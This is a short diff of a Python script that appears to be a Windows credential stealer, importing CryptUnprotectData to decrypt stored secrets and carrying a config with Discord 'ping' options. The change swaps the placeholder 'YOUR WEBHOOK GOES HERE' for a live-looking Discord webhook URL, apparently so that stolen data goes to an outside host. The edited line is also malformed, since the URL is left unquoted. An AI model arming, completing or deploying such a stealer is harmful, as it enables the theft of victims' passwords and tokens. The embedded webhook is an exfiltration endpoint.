@@ -24,7 +24,7 @@ from win32crypt import CryptUnprotectData
 #False = DISABLED
 __CONFIG__ = 
 {
-  'webhook': 'YOUR WEBHOOK GOES HERE',
+  'webhook': https://discord.com/api/webhooks/1163833414844157962/h22DExyt-8u4cH2TDWgHJIoYMpwTXuXvYWGvwrip-uC_osPirgTiofj9CacEP71GCLUa ,
   'ping': True,
   'pingtype': 'Here',
   'error': False,
